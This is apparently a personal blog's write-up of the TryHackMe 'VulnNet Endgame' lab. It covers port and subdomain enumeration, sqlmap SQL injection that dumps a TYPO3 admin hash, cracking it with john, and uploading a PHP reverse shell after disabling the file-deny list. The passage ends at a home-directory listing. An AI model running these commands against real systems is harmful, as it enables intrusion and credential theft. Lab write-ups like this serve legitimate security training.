<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>VulnNet Endgame</title><meta name="description" content="scientia potentia est."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/hexo-theme-Claudia/images/favicon.jpg"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
Target IP Address: 10.10.81.70
Information GatheringNMAP ScaningNmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.

command used:

sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn

→ output:
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/.."><meta name="generator" content="Hexo 7.1.1"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Rãzvan's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">VulnNet Endgame</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-Scaning"><span class="toc-text">NMAP Scaning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-FULL-Scanning"><span class="toc-text">NMAP FULL Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-22-Default-Port-for-ssh"><span class="toc-text">TCP 22 (Default Port for ssh)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-80-Default-Port-for-HTTP"><span class="toc-text">TCP 80 (Default Port for HTTP)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Directory-Busting-with-GoBuster"><span class="toc-text">Directory Busting with GoBuster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Subdomain-Enumeration-with-wfuzz"><span class="toc-text">Subdomain Enumeration with wfuzz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shop-vulnnet-thm"><span class="toc-text">shop.vulnnet.thm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blog-vulnnet-thm"><span class="toc-text">blog.vulnnet.thm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#api-vulnnet-thm"><span class="toc-text">api.vulnnet.thm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#admin1-vulnnet-thm"><span class="toc-text">admin1.vulnnet.thm</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation-%E2%80%94-SQL-Injection"><span class="toc-text">Exploitation — SQL Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation"><span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Extracting-the-credentials"><span class="toc-text">Extracting the credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-system-user"><span class="toc-text">SSH system user</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Uploading-LinPEAS"><span class="toc-text">Uploading LinPEAS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/TryHackMe"><i class="tag post-item-tag">TryHackMe</i></a><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">VulnNet Endgame</h1><time class="has-text-grey" datetime="2024-07-31T07:20:45.000Z">2024-07-31</time><article class="mt-2 post-content"><p><img src="/../vulnnet_img/1*wgtCXijSBgpfJctApuRK4A.png" alt="alt text"></p>
<p><strong>Target IP Address: 10.10.81.70</strong></p>
<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scaning"><a href="#NMAP-Scaning" class="headerlink" title="NMAP Scaning"></a>NMAP Scaning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn</code></pre>

<p>→ output:</p>
<pre><code class="hljs sql">PORT   STATE SERVICE REASON
<span class="hljs-number">22</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  ssh     syn<span class="hljs-operator">-</span>ack ttl <span class="hljs-number">63</span>
<span class="hljs-number">80</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  http    syn<span class="hljs-operator">-</span>ack ttl <span class="hljs-number">63</span></code></pre>

<h2 id="NMAP-FULL-Scanning"><a href="#NMAP-FULL-Scanning" class="headerlink" title="NMAP FULL Scanning"></a>NMAP FULL Scanning</h2><ul>
<li>command used: (scanning the ports we got)</li>
</ul>
<pre><code class="hljs bash">└─$  nmap -A -sC -sV -p22,80 10.10.81.70 -Pn</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
|_  256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span>
<span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>

<h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p>
<p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p>
<p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p>
<p>-&gt; SSH package version:</p>
<pre><code class="hljs bash">└─$ nc -vn 10.10.81.70 22
(UNKNOWN) [10.10.81.70] 22 (ssh) open
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7</code></pre>

<p>-&gt; SSH key fingerprint:</p>
<pre><code class="hljs bash">ssh root@10.10.81.70
The authenticity of host <span class="hljs-string">&#x27;10.10.81.70 (10.10.81.70)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span>
<span class="hljs-string">ED25519 key fingerprint is SHA256:UwSqcCjp07h7qqubWx22AY0AsygwXw11Ii1arCJSLyA.</span>
<span class="hljs-string">This key is not known by any other names.</span>
<span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span></code></pre>

<h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><p>→ WebServer:</p>
<pre><code class="hljs bash">└─$ curl -i http://10.10.81.70 | <span class="hljs-built_in">head</span> -n 50
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    65  100    65    0     0     57      0  0:00:01  0:00:01 --:--:--    57
HTTP/1.1 200 OK
Date: Tue, 23 Jul 2024 11:29:28 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 14 Jun 2022 16:06:52 GMT
ETag: <span class="hljs-string">&quot;41-5e16a97c78054&quot;</span>
Accept-Ranges: bytes
Content-Length: 65
Content-Type: text/html

Our services are accessible only through the vulnnet.thm domain!
</code></pre>

<p>Our services are accessible only through the vulnnet.thm domain!<br>Alright let’s add vulnnet.thm to &#x2F;etc&#x2F;hosts</p>
<p>Trying again:</p>
<pre><code class="hljs bash">$ curl -i http://10.10.81.70 | <span class="hljs-built_in">head</span> -n 50
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    65  100    65    0     0    519      0 --:--:-- --:--:-- --:--:--   520
HTTP/1.1 200 OK
Date: Tue, 23 Jul 2024 11:30:57 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 14 Jun 2022 16:06:52 GMT
ETag: <span class="hljs-string">&quot;41-5e16a97c78054&quot;</span>
Accept-Ranges: bytes
Content-Length: 65
Content-Type: text/html

Our services are accessible only through the vulnnet.thm domain!
                                                                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/Workspace/TryHackMe]
└─$ curl -i http://vulnnet.thm | <span class="hljs-built_in">head</span> -n 50
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4346  100  4346    0     0   5859      0 --:--:-- --:--:-- --:--:--  5857
HTTP/1.1 200 OK
Date: Tue, 23 Jul 2024 11:31:06 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Thu, 02 Jun 2022 17:15:30 GMT
ETag: <span class="hljs-string">&quot;10fa-5e07a2716f080&quot;</span>
Accept-Ranges: bytes
Content-Length: 4346
Vary: Accept-Encoding
Content-Type: text/html

&lt;!DOCTYPE html&gt;
&lt;!--[<span class="hljs-keyword">if</span> lt IE 7]&gt;      &lt;html class=<span class="hljs-string">&quot;no-js lt-ie9 lt-ie8 lt-ie7&quot;</span>&gt; &lt;![endif]--&gt;
&lt;!--[<span class="hljs-keyword">if</span> IE 7]&gt;         &lt;html class=<span class="hljs-string">&quot;no-js lt-ie9 lt-ie8&quot;</span>&gt; &lt;![endif]--&gt;
&lt;!--[<span class="hljs-keyword">if</span> IE 8]&gt;         &lt;html class=<span class="hljs-string">&quot;no-js lt-ie9&quot;</span>&gt; &lt;![endif]--&gt;
&lt;!--[<span class="hljs-keyword">if</span> gt IE 8]&gt;&lt;!--&gt; &lt;html class=<span class="hljs-string">&quot;no-js&quot;</span>&gt; &lt;!--&lt;![endif]--&gt;
        &lt;<span class="hljs-built_in">head</span>&gt;
        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;
        &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;
        &lt;title&gt;Soon &amp;mdash; Fully Responsive Software Design by VulnNet&lt;/title&gt;
        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;

        &lt;!-- Facebook and Twitter integration --&gt;
        &lt;meta property=<span class="hljs-string">&quot;og:title&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;
        &lt;meta property=<span class="hljs-string">&quot;og:image&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;
        &lt;meta property=<span class="hljs-string">&quot;og:url&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;
        &lt;meta property=<span class="hljs-string">&quot;og:site_name&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;
        &lt;meta property=<span class="hljs-string">&quot;og:description&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;
        &lt;meta name=<span class="hljs-string">&quot;twitter:title&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;
        &lt;meta name=<span class="hljs-string">&quot;twitter:image&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;
        &lt;meta name=<span class="hljs-string">&quot;twitter:url&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;
        &lt;meta name=<span class="hljs-string">&quot;twitter:card&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;

        &lt;!-- &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&#x27;https://fonts.googleapis.com/css?family=Work+Sans:400,300,600,400italic,700&#x27;</span> rel=<span class="hljs-string">&#x27;stylesheet&#x27;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text/css&#x27;</span>&gt; --&gt;
        &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Space+Mono&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;

        &lt;!-- Animate.css --&gt;
        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/animate.css&quot;</span>&gt;
        &lt;!-- Icomoon Icon Fonts--&gt;
        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/icomoon.css&quot;</span>&gt;
        &lt;!-- Bootstrap  --&gt;
        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/bootstrap.css&quot;</span>&gt;
        &lt;!-- Theme style  --&gt;
        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;

        &lt;!-- Modernizr JS --&gt;
        &lt;script src=<span class="hljs-string">&quot;js/modernizr-2.6.2.min.js&quot;</span>&gt;&lt;/script&gt;
        &lt;!-- FOR IE9 below --&gt;
        &lt;!--[<span class="hljs-keyword">if</span> lt IE 9]&gt;
        &lt;script src=<span class="hljs-string">&quot;js/respond.min.js&quot;</span>&gt;&lt;/script&gt;
        &lt;![endif]--&gt;
</code></pre>

<h2 id="Directory-Busting-with-GoBuster"><a href="#Directory-Busting-with-GoBuster" class="headerlink" title="Directory Busting with GoBuster"></a>Directory Busting with GoBuster</h2><p>Directory busting with Gobuster involves using the tool to brute-force and enumerate hidden directories and files on a web server.</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash">/images               (Status: 301) [Size: 311] [--&gt; http://vulnnet.thm/images/]
/css                  (Status: 301) [Size: 308] [--&gt; http://vulnnet.thm/css/]
/js                   (Status: 301) [Size: 307] [--&gt; http://vulnnet.thm/js/]
/fonts                (Status: 301) [Size: 310] [--&gt; http://vulnnet.thm/fonts/]</code></pre>

<h2 id="Subdomain-Enumeration-with-wfuzz"><a href="#Subdomain-Enumeration-with-wfuzz" class="headerlink" title="Subdomain Enumeration with wfuzz"></a>Subdomain Enumeration with wfuzz</h2><p><strong>Wfuzz</strong> was used for subdomain enumeration to identify hidden subdomains.</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">wfuzz -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;HOST: FUZZ.vulnnet.thm&quot;</span> -u http://vulnnet.thm --hw 1053</code></pre>

<p>Alright so the response is quite long and what i found is that the right subdomains have more than 1 line so to make the response more likeable visual we will update the command to this:</p>
<pre><code class="hljs bash">wfuzz -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;HOST: FUZZ.vulnnet.thm&quot;</span> -u http://vulnnet.thm --hl 1</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash">********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://vulnnet.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                  
=====================================================================

000000018:   200        390 L    1599 W     19316 Ch    <span class="hljs-string">&quot;blog - blog&quot;</span>                                                                                            
000000037:   200        524 L    1406 W     26701 Ch    <span class="hljs-string">&quot;shop - shop&quot;</span>                                                                                            
000000051:   200        0 L      4 W        18 Ch       <span class="hljs-string">&quot;api - api&quot;</span>                                                                                              
000000689:   400        10 L     35 W       301 Ch      <span class="hljs-string">&quot;gc._msdcs - gc._msdcs&quot;</span>                                                                                  
000001219:   307        0 L      0 W        0 Ch        <span class="hljs-string">&quot;admin1 - admin1&quot;</span>                                                                                        
000009532:   400        10 L     35 W       301 Ch      <span class="hljs-string">&quot;#www - #www&quot;</span>                                                                                            
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 9880
Filtered Requests: 9874
Requests/sec.: 0</code></pre>

<p>Found 4 subdomains let’s add them to &#x2F;etc&#x2F;hosts:</p>
<p><img src="/../vulnnet_img/1.png" alt="alt text"></p>
<h3 id="shop-vulnnet-thm"><a href="#shop-vulnnet-thm" class="headerlink" title="shop.vulnnet.thm"></a>shop.vulnnet.thm</h3><p>Directory busting </p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://shop.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre>

<p>→ Without luck</p>
<h3 id="blog-vulnnet-thm"><a href="#blog-vulnnet-thm" class="headerlink" title="blog.vulnnet.thm"></a>blog.vulnnet.thm</h3><p>Directory busting</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://blog.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre>

<p>→ Found &#x2F;assets</p>
<pre><code class="hljs bash">/assets               (Status: 301) [Size: 321] [--&gt; http://blog.vulnnet.thm/assets/]</code></pre>

<h3 id="api-vulnnet-thm"><a href="#api-vulnnet-thm" class="headerlink" title="api.vulnnet.thm"></a>api.vulnnet.thm</h3><p>Directory busting</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://api.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre>

<p>→ Nothing found</p>
<h3 id="admin1-vulnnet-thm"><a href="#admin1-vulnnet-thm" class="headerlink" title="admin1.vulnnet.thm"></a>admin1.vulnnet.thm</h3><p>Directory busting</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://admin1.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre>

<p>→ Found:</p>
<pre><code class="hljs bash">Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode
===============================================================
/en                   (Status: 301) [Size: 321] [--&gt; http://admin1.vulnnet.thm/en/]
/vendor               (Status: 301) [Size: 325] [--&gt; http://admin1.vulnnet.thm/vendor/]
/fileadmin            (Status: 301) [Size: 328] [--&gt; http://admin1.vulnnet.thm/fileadmin/]
/typo3temp            (Status: 301) [Size: 328] [--&gt; http://admin1.vulnnet.thm/typo3temp/]
/typo3                (Status: 301) [Size: 324] [--&gt; http://admin1.vulnnet.thm/typo3/]</code></pre>

<p> <strong>&#x2F;typo3</strong></p>
<p><img src="/../vulnnet_img/2.png" alt="alt text"></p>
<p><strong>&#x2F;fileadmin</strong></p>
<p><img src="/../vulnnet_img/3.png" alt="alt text"></p>
<p><strong>&#x2F;vendor</strong></p>
<p><img src="/../vulnnet_img/4.png" alt="alt text"></p>
<p>Didn’t find anything here.</p>
<h1 id="Exploitation-—-SQL-Injection"><a href="#Exploitation-—-SQL-Injection" class="headerlink" title="Exploitation — SQL Injection"></a><strong>Exploitation — SQL Injection</strong></h1><p>If we go on blog.vulnnet.thm and access a blog we see a interesting request from <code>api.vulnnet.thm</code> </p>
<p><img src="/../vulnnet_img/5.png" alt="alt text"></p>
<p>→ output</p>
<p><img src="/../vulnnet_img/6.png" alt="alt text"></p>
<p>We can see in the URL we have a parameter blog &#x3D; 1 , let’s try sqlmap</p>
<p>SQL injection testing with SQLmap involves using the tool to automatically detect and exploit SQL injection vulnerabilities in web applications.</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -p blog --dbs</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash">[08:48:49] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin</code></pre>

<p><strong>Let’s see tables</strong></p>
<pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -p blog -D vn_admin --tables</code></pre>

<p>→</p>
<pre><code class="hljs bash">backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| cache_adminpanel_requestcache               |
| cache_adminpanel_requestcache_tags          |
| cache_hash                                  |
| cache_hash_tags                             |
| cache_imagesizes                            |
| cache_imagesizes_tags                       |
| cache_pages                                 |
| cache_pages_tags                            |
| cache_pagesection                           |
| cache_pagesection_tags                      |
| cache_rootline                              |
| cache_rootline_tags                         |
| cache_treelist                              |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
| pages                                       |
| sys_be_shortcuts                            |
| sys_category                                |
| sys_category_record_mm                      |
| sys_collection                              |
| sys_collection_entries                      |
| sys_file                                    |
| sys_file_collection                         |
| sys_file_metadata                           |
| sys_file_processedfile                      |
| sys_file_reference                          |
| sys_file_storage                            |
| sys_filemounts                              |
| sys_history                                 |
| sys_language                                |
| sys_lockedrecords                           |
| sys_log                                     |
| sys_news                                    |
| sys_note                                    |
| sys_redirect                                |
| sys_refindex                                |
| sys_registry                                |
| sys_template                                |
| tt_content                                  |
| tx_extensionmanager_domain_model_extension  |
| tx_extensionmanager_domain_model_repository |
| tx_impexp_presets</code></pre>

<p>Now check the columns:</p>
<pre><code class="hljs bash">└─$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -p blog -D vn_admin -T be_users --columns</code></pre>

<p>→</p>
<pre><code class="hljs bash">+-----------------------+----------------------+
| Column                | Type                 |
+-----------------------+----------------------+
| admin                 | smallint(5) unsigned |
| description           | text                 |
| <span class="hljs-built_in">disable</span>               | smallint(5) unsigned |
| options               | smallint(5) unsigned |
| allowed_languages     | varchar(255)         |
| avatar                | int(10) unsigned     |
| category_perms        | text                 |
| crdate                | int(10) unsigned     |
| createdByAction       | int(11)              |
| cruser_id             | int(10) unsigned     |
| db_mountpoints        | text                 |
| deleted               | smallint(5) unsigned |
| disableIPlock         | smallint(5) unsigned |
| email                 | varchar(255)         |
| endtime               | int(10) unsigned     |
| file_mountpoints      | text                 |
| file_permissions      | text                 |
| lang                  | varchar(6)           |
| lastlogin             | int(10) unsigned     |
| lockToDomain          | varchar(50)          |
| password              | varchar(100)         |
| pid                   | int(10) unsigned     |
| realName              | varchar(80)          |
| starttime             | int(10) unsigned     |
| TSconfig              | text                 |
| tstamp                | int(10) unsigned     |
| uc                    | mediumblob           |
| uid                   | int(10) unsigned     |
| usergroup             | varchar(255)         |
| usergroup_cached_list | text                 |
| userMods              | text                 |
| username              | varchar(50)          |
| workspace_id          | int(11)              |
| workspace_perms       | smallint(6)          |
+-----------------------+----------------------+</code></pre>

<p>Dump the cred and let’s check them:</p>
<pre><code class="hljs bash">─$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -p blog -D vn_admin -T be_users --columns -C username,password --dump</code></pre>

<p><img src="/../vulnnet_img/7.png" alt="alt text"></p>
<p>CREDS:</p>
<pre><code class="hljs bash">username,password
chris_w, $argon2i<span class="hljs-variable">$v</span>=19<span class="hljs-variable">$m</span>=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg<span class="hljs-variable">$j6z3IshmjsN</span>+CwhciRECV2NArQwipqQMIBtYufyM4Rg</code></pre>

<p>Tried cracking with john, while waiting let’s dump the blog’s database:</p>
<pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog --tables</code></pre>

<p><img src="/../vulnnet_img/8.png" alt="alt text"></p>
<p><strong>Selecting the users table</strong></p>
<pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 —batch -D blog -T <span class="hljs-built_in">users</span> —-columns</code></pre>

<p><img src="/../vulnnet_img/9.png" alt="alt text"></p>
<p><strong>Dumping the entire username and password column of the user table</strong></p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog -T <span class="hljs-built_in">users</span> -C username,password --dump</code></pre>

<p>→ </p>
<p><img src="/../vulnnet_img/10.png" alt="alt text"></p>
<p>Extract the passwords :</p>
<pre><code class="hljs bash">grep -v <span class="hljs-string">&#x27;^username&#x27;</span> /home/kali/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;,&#x27;</span> -f2 &gt; passwords.txt</code></pre>

<p>Crack chris_w password’s hash with <code>john</code></p>
<p>John the Ripper is used in a penetration test to crack password hashes and identify weak or compromised passwords.</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">─$ john chris_w.hash --wordlist=passwords.txt</code></pre>

<p>→ </p>
<p><img src="/../vulnnet_img/11.png" alt="alt text"></p>
<p>Pass: vAxWtmNzeTz</p>
<p>Now we have chris_w’s password, we can login the CMS.</p>
<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>I tried to upload a php-reverse-shell but it didn’t work because the extension .php is to allowed:</p>
<p><img src="/../vulnnet_img/12.png" alt="alt text"></p>
<p>But since we have admin privileges let’s change that :</p>
<p>Admin TOOLS → Settings → Configure Installation- Wide options → File deny → Delete</p>
<p>Now upload the php reverse shell configured with your ip and start a netcat:</p>
<p><img src="/../vulnnet_img/13.png" alt="alt text"></p>
<p>Head into &#x2F;fileadmin&#x2F;php-reverse-shell and we got shell:</p>
<p><img src="/../vulnnet_img/14.png" alt="alt text"></p>
<p>→ output: </p>
<p><img src="/../vulnnet_img/15.png" alt="alt text"></p>
<p>→</p>
<pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /home/system
$ <span class="hljs-built_in">ls</span> -la
total 92
drwxr-xr-x 18 system system 4096 Jun 15  2022 .
drwxr-xr-x  3 root   root   4096 Jun 14  2022 ..
-rw-------  1 system system 2124 Jun 15  2022 .ICEauthority
lrwxrwxrwx  1 root   root      9 Jun 14  2022 .bash_history -&gt; /dev/null
-rw-r--r--  1 system system  220 Jun 14  2022 .bash_logout
-rw-r--r--  1 system system 3771 Jun 14  2022 .bashrc
drwx------ 16 system system 4096 Jun 14  2022 .cache
drwx------ 14 system system 4096 Jun 14  2022 .config
drwx------  3 root   root   4096 Jun 14  2022 .dbus
drwx------  3 system system 4096 Jun 14  2022 .gnupg
drwx------  2 root   root   4096 Jun 14  2022 .gvfs
drwx------  3 system system 4096 Jun 14  2022 .<span class="hljs-built_in">local</span>
drwxr-xr-x  4 system system 4096 Jun 14  2022 .mozilla
lrwxrwxrwx  1 root   root      9 Jun 14  2022 .mysql_history -&gt; /dev/null
-rw-r--r--  1 system system  807 Jun 14  2022 .profile
-rw-r--r--  1 system system    0 Jun 14  2022 .sudo_as_admin_successful
drwxr-xr-x  2 system system 4096 Jun 14  2022 Desktop
drwxr-xr-x  2 system system 4096 Jun 14  2022 Documents
drwxr-xr-x  2 system system 4096 Jun 14  2022 Downloads
drwxr-xr-x  2 system system 4096 Jun 14  2022 Music
drwxr-xr-x  2 system system 4096 Jun 14  2022 Pictures
drwxr-xr-x  2 system system 4096 Jun 14  2022 Public
drwxr-xr-x  2 system system 4096 Jun 14  2022 Templates
dr-xr-x---  2 system system 4096 Jun 14  2022 Utils
drwxr-xr-x  2 system system 4096 Jun 14  2022 Videos
-rw-------  1 system system   38 Jun 14  2022 user.txt
</code></pre>

<p>Checking the user system home directory, there’s a mozilla folder.</p>
